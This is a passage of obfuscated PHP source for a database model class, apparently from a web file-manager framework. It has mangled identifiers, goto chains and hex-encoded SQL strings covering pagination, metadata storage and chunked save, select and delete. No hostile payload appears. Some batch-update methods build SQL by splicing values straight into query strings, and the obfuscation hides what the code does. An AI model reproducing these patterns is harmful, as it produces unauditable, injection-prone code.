$in[$D¼Ìˆ­½º[370]] = !1; $eªƒÆªñá‘ = 100000000; $e’¯Å”õÌ = $eªƒÆªñá‘; } goto bâ¢—ñó à; d¥ÙŞ…¤¶: if (!is_array($EÃÜ†ó¡Ñó)) { $EÃÜ†ó¡Ñó = array(); } if ($dóìÅë§Şï == 1) { $E‚‘ÑßôÓù = count($EÃÜ†ó¡Ñó); } $D×Ã¨­ââ¥ = array($D¼Ìˆ­½º[373] => array($D¼Ìˆ­½º[374] => $E‚‘ÑßôÓù, $D¼Ìˆ­½º[370] => $e’¯Å”õÌ, $D¼Ìˆ­½º[360] => $E‘“ì÷Ö÷ğ, $D¼Ìˆ­½º[375] => $dóìÅë§Şï), $D¼Ìˆ­½º[376] => $EÃÜ†ó¡Ñó); goto bµğÅ·ã¥µ; AÜ±ÄÎÉÆÈ: $EÃÜ†ó¡Ñó = array(); $aÀ¦›èè‹Û = 1; if ($E‘“ì÷Ö÷ğ == 1 && $aÀ¦›èè‹Û) { $this->optionsValue($Aœˆáî›×ƒ); $EÃÜ†ó¡Ñó = $this->page($E‘“ì÷Ö÷ğ, $e’¯Å”õÌ)->select(); $E‚‘ÑßôÓù = is_array($EÃÜ†ó¡Ñó) ? count($EÃÜ†ó¡Ñó) : 0; if ($E‚‘ÑßôÓù < $e’¯Å”õÌ) { $dóìÅë§Şï = 1; } else { $this->optionsValue($c¹ïùĞ‡ÁÅ); $E‚‘ÑßôÓù = intval($this->count()); $dóìÅë§Şï = ceil($E‚‘ÑßôÓù / $e’¯Å”õÌ); } } else { $this->optionsValue($c¹ïùĞ‡ÁÅ); $E‚‘ÑßôÓù = intval($this->count()); $dóìÅë§Şï = ceil($E‚‘ÑßôÓù / $e’¯Å”õÌ); $E‘“ì÷Ö÷ğ = $E‘“ì÷Ö÷ğ >= $dóìÅë§Şï ? $dóìÅë§Şï : $E‘“ì÷Ö÷ğ; $this->optionsValue($Aœˆáî›×ƒ); $EÃÜ†ó¡Ñó = $this->page($E‘“ì÷Ö÷ğ, $e’¯Å”õÌ)->select(); } goto d¥ÙŞ…¤¶; BëÜß„µä¿: $e’¯Å”õÌ = $e’¯Å”õÌ <= 5 ? 5 : ($e’¯Å”õÌ >= $eªƒÆªñá‘ ? $eªƒÆªñá‘ : $e’¯Å”õÌ); $E‘“ì÷Ö÷ğ = intval(isset($in[$D¼Ìˆ­½º[360]]) && $in[$D¼Ìˆ­½º[360]] ? $in[$D¼Ìˆ­½º[360]] : $E‘“ì÷Ö÷ğ); $E‘“ì÷Ö÷ğ = $E‘“ì÷Ö÷ğ <= 1 ? 1 : $E‘“ì÷Ö÷ğ; goto AÜ±ÄÎÉÆÈ; AèË°Öç: $D¼Ìˆ­½º =& $_SERVER[£¶ä½¶¢]; global $in; $Aœˆáî›×ƒ = $this->optionsValue(); goto A…¬Ì†ó»Ğ; c‡ƒ„­‹†í: } protected function checkLength($FÎ”Æé­º£, $d„Šæ†Œç = 0, $aƒá¿ñ˜° = '') { $a­£ÏÍ¶ =& $_SERVER[£¶ä½¶¢]; $d„Šæ†Œç = $d„Šæ†Œç ? $d„Šæ†Œç : 65536; if (!$FÎ”Æé­º£ || strlen($FÎ”Æé­º£) < $d„Šæ†Œç) { return; } $aƒá¿ñ˜° = $aƒá¿ñ˜° ? $aƒá¿ñ˜° . $a­£ÏÍ¶[78] : $a­£ÏÍ¶[43]; show_json($aƒá¿ñ˜° . LNG($a­£ÏÍ¶[377]) . "\50{$d„Šæ†Œç}\x29", !1); } protected function metaSet($B¤ùÀÙ©ÇÙ, $d‰Ø†ğ»º± = null, $Bïù»‹ÍŠ‹ = null) { goto fğª ê¡‘¹; bÏ¯Œ•ºì: $B¯¸«“–´ = $E®ÔÎ—ó…[382] . $this->tableMeta; CacheLock::lock($B¯¸«“–´); $B¡§±È¦¼->where(array($AÒ¹ßŒ£ô => $B¤ùÀÙ©ÇÙ))->addAll($BÜÚîöœ‰¯, array(), !0); goto dÑ±æª; EÉÉ‚¬ë¹: $eœ³ƒ“ÁŒÕ = $this->tableMeta[$E®ÔÎ—ó…[379]]; $B¡§±È¦¼ = Model($eœ³ƒ“ÁŒÕ); $b¯–—Ö‚Ù‰ = array($AÒ¹ßŒ£ô => $B¤ùÀÙ©ÇÙ, $E®ÔÎ—ó…[380] => $d‰Ø†ğ»º±); goto CÒ²¬–©§; Dø†ëÛÏª¾: if (is_string($d‰Ø†ğ»º±)) { $FÙÍÃ…à÷[$d‰Ø†ğ»º±] = $Bïù»‹ÍŠ‹; } $BÜÚîöœ‰¯ = array(); foreach ($FÙÍÃ…à÷ as $D¶íËÆ·¡ê => $Fä‹”®’Ô’) { $this->checkLength($Fä‹”®’Ô’, !1, $eœ³ƒ“ÁŒÕ . $E®ÔÎ—ó…[14] . $D¶íËÆ·¡ê); $BÜÚîöœ‰¯[] = array($AÒ¹ßŒ£ô => $B¤ùÀÙ©ÇÙ, $E®ÔÎ—ó…[103] => $D¶íËÆ·¡ê, $E®ÔÎ—ó…[381] => $Fä‹”®’Ô’); } goto bÏ¯Œ•ºì; dÑ±æª: CacheLock::unlock($B¯¸«“–´); return !0; goto C¹ÔµÈö½Ñ; fğª ê¡‘¹: $E®ÔÎ—ó… =& $_SERVER[£¶ä½¶¢]; if (!$this->tableMeta || !$B¤ùÀÙ©ÇÙ) { return !1; } $AÒ¹ßŒ£ô = $this->tableMeta[$E®ÔÎ—ó…[378]]; goto EÉÉ‚¬ë¹; CÒ²¬–©§: if (is_null($d‰Ø†ğ»º±)) { return $B¡§±È¦¼->where(array($AÒ¹ßŒ£ô => $B¤ùÀÙ©ÇÙ))->delete(); } if (is_null($Bïù»‹ÍŠ‹) && is_string($d‰Ø†ğ»º±)) { return $B¡§±È¦¼->where($b¯–—Ö‚Ù‰)->delete(); } $FÙÍÃ…à÷ = is_array($d‰Ø†ğ»º±) ? $d‰Ø†ğ»º± : array(); goto Dø†ëÛÏª¾; C¹ÔµÈö½Ñ: } public function metaGet($b®¸Ç…±İ, $BÀÄŒ“Î• = false) { goto D®·Ëµ ‚¥; b±÷Ş˜ˆë: $Dó¯ä„Ûğ = Model($this->tableMeta[$c÷Ø¦¡Ş©‚[379]]); if ($BÀÄŒ“Î•) { $FéÊ¾²Ì˜ = array($Bˆã§¶ğ‚Ó => $b®¸Ç…±İ, $c÷Ø¦¡Ş©‚[103] => $BÀÄŒ“Î•); return $Dó¯ä„Ûğ->where($FéÊ¾²Ì˜)->getField($c÷Ø¦¡Ş©‚[381]); } $FéÊ¾²Ì˜ = array($Bˆã§¶ğ‚Ó => $b®¸Ç…±İ); goto EÏ¹ÄÑÚˆ¬; EÏ¹ÄÑÚˆ¬: $Cš­ÅÇÌƒ = $Dó¯ä„Ûğ->field($c÷Ø¦¡Ş©‚[383])->where($FéÊ¾²Ì˜)->select(); $Cš­ÅÇÌƒ = array_to_keyvalue($Cš­ÅÇÌƒ, $c÷Ø¦¡Ş©‚[103], $c÷Ø¦¡Ş©‚[381]); return $Cš­ÅÇÌƒ; goto aˆ¹ëµêò¹; D®·Ëµ ‚¥: $c÷Ø¦¡Ş©‚ =& $_SERVER[£¶ä½¶¢]; if (!$this->tableMeta) { return array(); } $Bˆã§¶ğ‚Ó = $this->tableMeta[$c÷Ø¦¡Ş©‚[378]]; goto b±÷Ş˜ˆë; aˆ¹ëµêò¹: } private function checkDataAutoHas($E©™é‰Ø—) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cèïœÁ¬œ) { if (in_array($E©™é‰Ø—, explode($_SERVER[£¶ä½¶¢][57], $cèïœÁ¬œ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$d±ÕñåÒØø, $AÂİÂ‹»´ª) { $dÀáÜÊó‚± =& $_SERVER[£¶ä½¶¢]; foreach ($this->dataAuto as $BñØËÓÑÜ) { $bªÄš®Ä = $BñØËÓÑÜ[0]; if (!in_array($AÂİÂ‹»´ª, explode($dÀáÜÊó‚±[57], $BñØËÓÑÜ[2]))) { continue; } switch (trim($BñØËÓÑÜ[3])) { case $dÀáÜÊó‚±[328]: case $dÀáÜÊó‚±[329]: $F î¶Îê°‹ = $BñØËÓÑÜ[1]; $dğ‹ÑÔ¯ö© = isset($BñØËÓÑÜ[4]) ? (array) $BñØËÓÑÜ[4] : array(); if ($F î¶Îê°‹ == $dÀáÜÊó‚±[207] && array_key_exists($bªÄš®Ä, $d±ÕñåÒØø)) { if (!$d±ÕñåÒØø[$bªÄš®Ä]) { unset($d±ÕñåÒØø[$bªÄš®Ä]); } break; } if (isset($d±ÕñåÒØø[$bªÄš®Ä])) { array_unshift($dğ‹ÑÔ¯ö©, $d±ÕñåÒØø[$bªÄš®Ä]); } if ($dÀáÜÊó‚±[328] == $BñØËÓÑÜ[3]) { $d±ÕñåÒØø[$bªÄš®Ä] = call_user_func_array($F î¶Îê°‹, $dğ‹ÑÔ¯ö©); } else { $d±ÕñåÒØø[$bªÄš®Ä] = call_user_func_array(array(&$this, $F î¶Îê°‹), $dğ‹ÑÔ¯ö©); } break; case $dÀáÜÊó‚±[280]: $d±ÕñåÒØø[$bªÄš®Ä] = $d±ÕñåÒØø[$BñØËÓÑÜ[1]]; break; case $dÀáÜÊó‚±[301]: if (isset($d±ÕñåÒØø[$bªÄš®Ä]) && !is_string($d±ÕñåÒØø[$bªÄš®Ä])) { $d±ÕñåÒØø[$bªÄš®Ä] = json_encode_force($d±ÕñåÒØø[$bªÄš®Ä]); } break; case $dÀáÜÊó‚±[330]: if ($d±ÕñåÒØø[$bªÄš®Ä] === $dÀáÜÊó‚±[43]) { unset($d±ÕñåÒØø[$bªÄš®Ä]); } break; case $dÀáÜÊó‚±[331]: $d±ÕñåÒØø[$bªÄš®Ä] = $BñØËÓÑÜ[1]; default: break; } } if ($AÂİÂ‹»´ª == $dÀáÜÊó‚±[364]) { $Fó®·Ä­ßÏ = strtolower($this->db->getDbType()); if (strpos($Fó®·Ä­ßÏ, $dÀáÜÊó‚±[19]) !== 0) { return; } $c×Ï…¹Ğù÷ = $this->field(!0)->fields; $D¶™èà¸Ş… = $c×Ï…¹Ğù÷[$dÀáÜÊó‚±[259]]; if (isset($c×Ï…¹Ğù÷[$dÀáÜÊó‚±[258]])) { unset($D¶™èà¸Ş…[$c×Ï…¹Ğù÷[$dÀáÜÊó‚±[258]]]); } foreach ($D¶™èà¸Ş… as $fâ†©áôƒË => $AÂİÂ‹»´ª) { if (!isset($d±ÕñåÒØø[$fâ†©áôƒË])) { $d±ÕñåÒØø[$fâ†©áôƒË] = $dÀáÜÊó‚±[43]; } } } } private function dataAfterFilter(&$fãœø‚ï‘) { $EÖ‰ËÆ¡ôÁ =& $_SERVER[£¶ä½¶¢]; foreach ($this->dataAuto as $fãÀÓ«¢œ–) { $fß›¡°º• = $fãÀÓ«¢œ–[0]; if (!in_array($EÖ‰ËÆ¡ôÁ[366], explode($EÖ‰ËÆ¡ôÁ[57], $fãÀÓ«¢œ–[2]))) { continue; } if (!isset($fãœø‚ï‘[$fß›¡°º•])) { continue; } switch (trim($fãÀÓ«¢œ–[3])) { case $EÖ‰ËÆ¡ôÁ[328]: case $EÖ‰ËÆ¡ôÁ[329]: $dÃšÕÚ›  = isset($fãÀÓ«¢œ–[4]) ? (array) $fãÀÓ«¢œ–[4] : array(); array_unshift($dÃšÕÚ› , $fãœø‚ï‘[$fß›¡°º•]); if ($EÖ‰ËÆ¡ôÁ[328] == $fãÀÓ«¢œ–[3]) { $fãœø‚ï‘[$fß›¡°º•] = call_user_func_array($fãÀÓ«¢œ–[1], $dÃšÕÚ› ); } else { $fãœø‚ï‘[$fß›¡°º•] = call_user_func_array(array(&$this, $fãÀÓ«¢œ–[1]), $dÃšÕÚ› ); } break; case $EÖ‰ËÆ¡ôÁ[280]: $fãœø‚ï‘[$fß›¡°º•] = $fãœø‚ï‘[$fãÀÓ«¢œ–[1]]; break; case $EÖ‰ËÆ¡ôÁ[301]: $Dá½…××Á = $fãœø‚ï‘[$fß›¡°º•]; $fãœø‚ï‘[$fß›¡°º•] = json_decode($Dá½…××Á, !0); if (is_null($fãœø‚ï‘[$fß›¡°º•])) { $fãœø‚ï‘[$fß›¡°º•] = $Dá½…××Á; } break; case $EÖ‰ËÆ¡ôÁ[330]: if ($fãœø‚ï‘[$fß›¡°º•] === $EÖ‰ËÆ¡ôÁ[43]) { unset($fãœø‚ï‘[$fß›¡°º•]); } break; case $EÖ‰ËÆ¡ôÁ[331]: $fãœø‚ï‘[$fß›¡°º•] = $fãÀÓ«¢œ–[1]; default: break; } } } public function saveAll($CÉÅóˆË±Û) { goto F„µ÷§Œ·; FÙ‡Ûñ¥ğé: $this->chunkEventSet(); goto e¡¨˜¬®óÁ; D ‘ìÅØµÁ: $AèÒ÷…À†á = array(); $EÔ¿¡”££è = count($CÉÅóˆË±Û); for ($d«ùĞË‡§ô = 0; $d«ùĞË‡§ô < $EÔ¿¡”££è; $d«ùĞË‡§ô++) { $a²ëèÄ­‹ = $CÉÅóˆË±Û[$d«ùĞË‡§ô]; if (!is_array($a²ëèÄ­‹) || count($a²ëèÄ­‹) != 4) { continue; } $EŠİË—Õ¥ = "\125\120\x44\x41\x54\105\x20\140{$DĞ™è¢Ê§Û}\140\x20\x53\105\x54\40{$a²ëèÄ­‹[2]}\40\x3d\x20\x43\x41\x53\105\x20{$a²ëèÄ­‹[0]}\x20\xa"; if ($aÜ¶¸ì§Š¾ == 0) { $Cåõóà®Åø = $EŠİË—Õ¥; } $AèÒ÷…À†á[] = $FÌ¼ÁÂ­ÆÍ[126] . $a²ëèÄ­‹[1] . $FÌ¼ÁÂ­ÆÍ[126]; $aÜ¶¸ì§Š¾++; $Cåõóà®Åø .= "\40\x57\110\105\116\40\47{$a²ëèÄ­‹[1]}\x27\40\124\110\x45\116\40\x27{$a²ëèÄ­‹[3]}\x27\40\xa"; if ($aÜ¶¸ì§Š¾ == $BÒ«–Àº¯ || $d«ùĞË‡§ô == $EÔ¿¡”££è - 1) { goto e‚¨…¼øÈ°; càåòÌÙº•: $AèÒ÷…À†á = array(); goto C¿ñÚæ×ğ; C…©ôÁŞ“¦: $aÜ¶¸ì§Š¾ = 0; $Cåõóà®Åø = $EŠİË—Õ¥; $this->chunkEventCheck(count($AèÒ÷…À†á)); goto càåòÌÙº•; e‚¨…¼øÈ°: $e½¸«¼ ¾ = implode($FÌ¼ÁÂ­ÆÍ[57], $AèÒ÷…À†á); $Cåõóà®Åø .= "\x20\x45\116\x44\x20\x20\127\110\x45\x52\105\40{$a²ëèÄ­‹[0]}\x20\111\116\40\x28{$e½¸«¼ ¾}\x29\x20"; $this->execute($Cåõóà®Åø); goto C…©ôÁŞ“¦; C¿ñÚæ×ğ: } } goto FÙ‡Ûñ¥ğé; F„µ÷§Œ·: $FÌ¼ÁÂ­ÆÍ =& $_SERVER[£¶ä½¶¢]; $DĞ™è¢Ê§Û = $this->tablePrefix . $this->tableName; $BÒ«–Àº¯ = self::SQL_WHERE_IN_CHUNK; goto Aî‡”ŞÑˆ»; Aî‡”ŞÑˆ»: $CÉÅóˆË±Û = is_array($CÉÅóˆË±Û) ? $CÉÅóˆË±Û : array(); $Cåõóà®Åø = $FÌ¼ÁÂ­ÆÍ[13]; $aÜ¶¸ì§Š¾ = 0; goto D ‘ìÅØµÁ; e¡¨˜¬®óÁ: } public function saveAllEach($BÌâÖ©Ì†î) { $cë±Ä­Ã¹­ =& $_SERVER[£¶ä½¶¢]; $Dªßå‚Î = $this->tablePrefix . $this->tableName; foreach ($BÌâÖ©Ì†î as $eùøìÆ¿©) { if (!is_array($eùøìÆ¿©) || count($eùøìÆ¿©) != 4) { continue; } $aªÏ“Òäåˆ = $eùøìÆ¿©[0] . $cë±Ä­Ã¹­[384] . $eùøìÆ¿©[1] . $cë±Ä­Ã¹­[126]; $dÒ¹›šíì® = $eùøìÆ¿©[2] . $cë±Ä­Ã¹­[384] . $eùøìÆ¿©[3] . $cë±Ä­Ã¹­[126]; $fÜàÀ†‹‘ˆ = "\165\160\144\141\x74\x65\40{$Dªßå‚Î}\40\163\x65\164\x20{$dÒ¹›šíì®}\40\x77\150\x65\162\x65\40{$aªÏ“Òäåˆ}\73"; $this->execute($fÜàÀ†‹‘ˆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($aÊì×äÁõë = false, $b”ë§¤ŸÄæ = false) { $this->_chunkEvent = $aÊì×äÁõë; $this->_chunkEventParam = $b”ë§¤ŸÄæ; } private function chunkEventCheck($c‹òêî³£ë) { if (!$this->_chunkEvent) { return; } $B›¼Ğœ¤¨ƒ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $B›¼Ğœ¤¨ƒ[$_SERVER[£¶ä½¶¢][385]] = $c‹òêî³£ë; Hook::trigger($this->_chunkEvent, $B›¼Ğœ¤¨ƒ); } public function addAll($DÛÀÑŠ“ƒ, $Fé•Ù’ƒ­¸ = array(), $FÊèÒÒÈç® = false) { goto fÍÓĞÉ©¤Ò; fÍÓĞÉ©¤Ò: $fö­Ø¯¡öâ =& $_SERVER[£¶ä½¶¢]; ignore_timeout(); $eŸŸ»ÒßË‹ = self::SQL_WHERE_IN_CHUNK; goto eŞê¹Ì´ø; eŞê¹Ì´ø: if (empty($DÛÀÑŠ“ƒ)) { $this->error = think_lang($fö­Ø¯¡öâ[278]); return !1; } $Fé•Ù’ƒ­¸ = $this->_parseOptions($Fé•Ù’ƒ­¸); foreach ($DÛÀÑŠ“ƒ as $eÍÙ½‡Ÿè => $c’‚œ¢–º) { $DÛÀÑŠ“ƒ[$eÍÙ½‡Ÿè] = $this->_facade($c’‚œ¢–º); $this->_beforeInsert($DÛÀÑŠ“ƒ[$eÍÙ½‡Ÿè], $Fé•Ù’ƒ­¸); } goto F‘ò¥ìÌœœ; F‘ò¥ìÌœœ: if (method_exists($this->db, $fö­Ø¯¡öâ[279])) { for ($BÕ–³é×‚ = 0; $BÕ–³é×‚ < count($DÛÀÑŠ“ƒ); $BÕ–³é×‚ += $eŸŸ»ÒßË‹) { $e™ÕÂ©¾ó´ = array_slice($DÛÀÑŠ“ƒ, $BÕ–³é×‚, $eŸŸ»ÒßË‹); if (!is_array($e™ÕÂ©¾ó´) || count($e™ÕÂ©¾ó´) == 0) { break; } $D„Çâù‘®± = $this->db->insertAll($e™ÕÂ©¾ó´, $Fé•Ù’ƒ­¸, $FÊèÒÒÈç®); $this->chunkEventCheck(count($e™ÕÂ©¾ó´)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($DÛÀÑŠ“ƒ as $eÍÙ½‡Ÿè => $c’‚œ¢–º) { $D„Çâù‘®± = $this->db->insert($c’‚œ¢–º, $Fé•Ù’ƒ­¸, $FÊèÒÒÈç®); } $this->commit(); } if (!1 !== $D„Çâù‘®±) { $FÄÅÆµâĞ¤ = $this->getLastInsID(); if ($FÄÅÆµâĞ¤) { return $FÄÅÆµâĞ¤; } } return $D„Çâù‘®±; goto A‰»æ–·÷Ì; A‰»æ–·÷Ì: } public function save($dŸÙ‡·š·­ = '', $D«Ğ°˜µ = array()) { goto c¿Ş±Ş¬‹´; bó»·½ª˜»: $dŸÇäÂôÛÊ = $e„¾¤¶‹…¼[$FİÚÁó¾¶„[282]][$a‰Ñøõ¶][1]; $dŸÇäÂôÛÊ = is_array($dŸÇäÂôÛÊ) ? $dŸÇäÂôÛÊ : array(); $F¥™¬Œïéˆ = count($dŸÇäÂôÛÊ); goto cÆÉ­‡Êœ; cÆÉ­‡Êœ: for ($e·æ—Š‚àÇ = 0; $e·æ—Š‚àÇ < $F¥™¬Œïéˆ; $e·æ—Š‚àÇ += $b‰öÂòÈ“¿) { $dŠÃ¥÷¿² = array_slice($dŸÇäÂôÛÊ, $e·æ—Š‚àÇ, $b‰öÂòÈ“¿); if (!is_array($dŠÃ¥÷¿²) || count($dŠÃ¥÷¿²) == 0) { break; } $e„¾¤¶‹…¼[$FİÚÁó¾¶„[282]][$a‰Ñøõ¶][1] = $dŠÃ¥÷¿²; $this->optionsValue($e„¾¤¶‹…¼); $e‹¦åÓ¬øĞ += parent::save($dŸÙ‡·š·­, $D«Ğ°˜µ); $this->chunkEventCheck(count($dŠÃ¥÷¿²)); } $this->chunkEventSet(); return $e‹¦åÓ¬øĞ; goto a†é©Á¾™Â; c¿Ş±Ş¬‹´: $FİÚÁó¾¶„ =& $_SERVER[£¶ä½¶¢]; $b‰öÂòÈ“¿ = self::SQL_WHERE_IN_CHUNK; $e„¾¤¶‹…¼ = $this->optionsValue(); goto BİÆ«¢Šîâ; BİÆ«¢Šîâ: $a‰Ñøõ¶ = $this->findWhereField($e„¾¤¶‹…¼); if (!$a‰Ñøõ¶) { return parent::save($dŸÙ‡·š·­, $D«Ğ°˜µ); } $e‹¦åÓ¬øĞ = 0; goto bó»·½ª˜»; a†é©Á¾™Â: } public function add($C“ÙÄ¦ñ¹ = '', $cïĞƒ‹’Ê = array(), $CÆ¾æ›ÇŞ¥ = false) { if ($this->addTaskStatus && is_array($C“ÙÄ¦ñ¹)) { $this->addTaskData[] = $C“ÙÄ¦ñ¹; return; } return parent::add($C“ÙÄ¦ñ¹, $cïĞƒ‹’Ê, $CÆ¾æ›ÇŞ¥); } public function parseWhereLike($dÓ‚²ç™ë½, $B§ƒÔÜ‡Š = '', $aº®å…×è« = false, &$Eö¢®Í„ƒÌ = false) { goto cãÈ®‚²í; f´ÉïÍ¼øã: foreach ($dÓ‚²ç™ë½ as $DÏÚÒ¥²é— => $E˜Ï©œ‹Íˆ) { if (is_array($E˜Ï©œ‹Íˆ) && count($E˜Ï©œ‹Íˆ) == 2 && $E˜Ï©œ‹Íˆ[0] == $c‘”ëÒÆ—¯[388] && is_string($E˜Ï©œ‹Íˆ[1]) && substr($E˜Ï©œ‹Íˆ[1], 0, 1) == $c‘”ëÒÆ—¯[389] && substr($E˜Ï©œ‹Íˆ[1], strlen($E˜Ï©œ‹Íˆ[1]) - 1, 1) == $c‘”ëÒÆ—¯[389]) { goto a©ÙÈŒçŒ; C¼Ù—ôÜ×: $E‰™ãµ®Ï = $this->db->escapeString($E‰™ãµ®Ï); if (!strpos($Aîœ×î¼ßğ, $c‘”ëÒÆ—¯[105])) { $Aîœ×î¼ßğ = $c‘”ëÒÆ—¯[390] . $Aîœ×î¼ßğ . $c‘”ëÒÆ—¯[390]; } $D°„ŒÀÍ = $c‘”ëÒÆ—¯[192] . $E‰™ãµ®Ï . $c‘”ëÒÆ—¯[192]; goto EĞ ç±Äí®; E†ô¸­…—: continue; goto f‹Í¨ˆ†Ğ˜; a©ÙÈŒçŒ: $Eö¢®Í„ƒÌ = !0; $Aîœ×î¼ßğ = is_string($DÏÚÒ¥²é—) ? $DÏÚÒ¥²é— : $B§ƒÔÜ‡Š; $E‰™ãµ®Ï = substr($E˜Ï©œ‹Íˆ[1], 1, strlen($E˜Ï©œ‹Íˆ[1]) - 2); goto C¼Ù—ôÜ×; EĞ ç±Äí®: if ($eÔÍô¼²ï[$c‘”ëÒÆ—¯[391]]) { $D°„ŒÀÍ = $c‘”ëÒÆ—¯[392] . $E‰™ãµ®Ï . $c‘”ëÒÆ—¯[393]; if ($eÔÍô¼²ï[$c‘”ëÒÆ—¯[394]]) { $D°„ŒÀÍ = $c‘”ëÒÆ—¯[393] . $E‰™ãµ®Ï . $c‘”ëÒÆ—¯[392]; } } $eñ¢¶¿ßÔ[$C¢Šøá¨å] = $c‘”ëÒÆ—¯[395] . $Aîœ×î¼ßğ . $c‘”ëÒÆ—¯[396] . $D°„ŒÀÍ . $c‘”ëÒÆ—¯[397]; $C¢Šøá¨å++; goto E†ô¸­…—; f‹Í¨ˆ†Ğ˜: } if (is_array($E˜Ï©œ‹Íˆ)) { $B§ƒÔÜ‡Š = is_string($DÏÚÒ¥²é—) ? $DÏÚÒ¥²é— : $B§ƒÔÜ‡Š; $E˜Ï©œ‹Íˆ = $this->parseWhereLike($E˜Ï©œ‹Íˆ, $B§ƒÔÜ‡Š, !0, $Eö¢®Í„ƒÌ); } if (is_numeric($DÏÚÒ¥²é—)) { $eñ¢¶¿ßÔ[$C¢Šøá¨å] = $E˜Ï©œ‹Íˆ; $C¢Šøá¨å++; } else { $eñ¢¶¿ßÔ[$DÏÚÒ¥²é—] = $E˜Ï©œ‹Íˆ; } } if ($Eö¢®Í„ƒÌ && !$aº®å…×è«) { } return $eñ¢¶¿ßÔ; goto dùœ…´òé; b·—Øµç„÷: if (!is_array($dÓ‚²ç™ë½)) { return $dÓ‚²ç™ë½; } $eñ¢¶¿ßÔ = array(); $C¢Šøá¨å = 0; goto f´ÉïÍ¼øã; cãÈ®‚²í: $c‘”ëÒÆ—¯ =& $_SERVER[£¶ä½¶¢]; $eÔÍô¼²ï = $GLOBALS[$c‘”ëÒÆ—¯[16]][$c‘”ëÒÆ—¯[386]]; if (!$eÔÍô¼²ï[$c‘”ëÒÆ—¯[387]]) { return $dÓ‚²ç™ë½; } goto b·—Øµç„÷; dùœ…´òé: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Cï„‹éÅ‰é = array()) { goto E–«êÊ¼ò‚; EĞ»“ºŞÁ…: $A½µá»ĞÈÉ = is_array($A½µá»ĞÈÉ) ? $A½µá»ĞÈÉ : array(); $C†®âÖ‘– = null; for ($eÙˆå„šÎõ = 0; $eÙˆå„šÎõ < count($A½µá»ĞÈÉ); $eÙˆå„šÎõ += $CÔ‹¯ ¢¾‹) { $FÑ„‰Íæßì = array_slice($A½µá»ĞÈÉ, $eÙˆå„šÎõ, $CÔ‹¯ ¢¾‹); if (!is_array($FÑ„‰Íæßì) || count($FÑ„‰Íæßì) == 0) { break; } $A¥ÈëÔ«Š[$eëßº›¿—[282]][$cĞáŸ²äÃÒ][1] = $FÑ„‰Íæßì; $this->optionsValue($A¥ÈëÔ«Š); $Fµò²ÇÅœ = parent::select($Cï„‹éÅ‰é); if (!$Fµò²ÇÅœ) { continue; } $C†®âÖ‘– = is_array($C†®âÖ‘–) ? $C†®âÖ‘– : array(); $C†®âÖ‘– = array_merge($C†®âÖ‘–, $Fµò²ÇÅœ); } goto D°ïºƒ ˜Š; E–«êÊ¼ò‚: $eëßº›¿— =& $_SERVER[£¶ä½¶¢]; $CÔ‹¯ ¢¾‹ = self::SQL_WHERE_IN_CHUNK; $A¥ÈëÔ«Š = $this->optionsValue(); goto e±ÎÁÃòåŸ; D°ïºƒ ˜Š: return $C†®âÖ‘–; goto C¯ÁóÙ…‘ê; e±ÎÁÃòåŸ: $cĞáŸ²äÃÒ = $this->findWhereField($A¥ÈëÔ«Š); if (!$cĞáŸ²äÃÒ || isset($A¥ÈëÔ«Š[$eëßº›¿—[299]]) || isset($A¥ÈëÔ«Š[$eëßº›¿—[360]])) { return parent::select($Cï„‹éÅ‰é); } $A½µá»ĞÈÉ = $A¥ÈëÔ«Š[$eëßº›¿—[282]][$cĞáŸ²äÃÒ][1]; goto EĞ»“ºŞÁ…; C¯ÁóÙ…‘ê: } public function delete($b–„ºêÙ›Á = array()) { goto a°Îøê’; Eèšˆªº: $bé«¢¬Ş¥ = $f³ôã‡–ì[$AÅš³ªÂŸå[282]][$E¾²ËÉòÚÈ][1]; $bé«¢¬Ş¥ = is_array($bé«¢¬Ş¥) ? $bé«¢¬Ş¥ : array(); for ($F•óæË÷ˆ = 0; $F•óæË÷ˆ < count($bé«¢¬Ş¥); $F•óæË÷ˆ += $EôÇô„ò¤) { $CÌæšßˆŒ‹ = array_slice($bé«¢¬Ş¥, $F•óæË÷ˆ, $EôÇô„ò¤); if (!is_array($CÌæšßˆŒ‹) || count($CÌæšßˆŒ‹) == 0) { break; } $f³ôã‡–ì[$AÅš³ªÂŸå[282]][$E¾²ËÉòÚÈ][1] = $CÌæšßˆŒ‹; $this->optionsValue($f³ôã‡–ì); $B„„Æì¯ƒ– += parent::delete($b–„ºêÙ›Á); } goto aÙ‡´Ü¸Îî; aÙ‡´Ü¸Îî: return $B„„Æì¯ƒ–; goto E«å Ê²Ø–; cœ¢³Ö—Ÿ‹: $E¾²ËÉòÚÈ = $this->findWhereField($f³ôã‡–ì); if (!$E¾²ËÉòÚÈ) { return parent::delete($b–„ºêÙ›Á); } $B„„Æì¯ƒ– = 0; goto Eèšˆªº; a°Îøê’: $AÅš³ªÂŸå =& $_SERVER[£¶ä½¶¢]; $EôÇô„ò¤ = self::SQL_WHERE_IN_CHUNK; $f³ôã‡–ì = $this->optionsValue(); goto cœ¢³Ö—Ÿ‹; E«å Ê²Ø–: } private function findWhereField($dÅÅ‹Š·Œ) { $C‡­ÏŠ¨‚¯ =& $_SERVER[£¶ä½¶¢]; $bß²ö…‘ = self::SQL_WHERE_IN_CHUNK; if (!is_array($dÅÅ‹Š·Œ) || !is_array($dÅÅ‹Š·Œ[$C‡­ÏŠ¨‚¯[282]])) { return !1; } foreach ($dÅÅ‹Š·Œ[$C‡­ÏŠ¨‚¯[282]] as $f‹òª§™–Ã => $aïó´Š…¬•) { if (is_array($aïó´Š…¬•) && isset($aïó´Š…¬•[0]) && is_string($aïó´Š…¬•[0]) && strtolower($aïó´Š…¬•[0]) == $C‡­ÏŠ¨‚¯[17] && is_array($aïó´Š…¬•[1]) && count($aïó´Š…¬•[1]) > $bß²ö…‘) { ignore_timeout(); return $f‹òª§™–Ã; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\155\117\x70\x74\151\157\x6e"; public $field = array(); public function listData($bà‰šÔ÷Ç = false, $FŠºØÙóÏ = 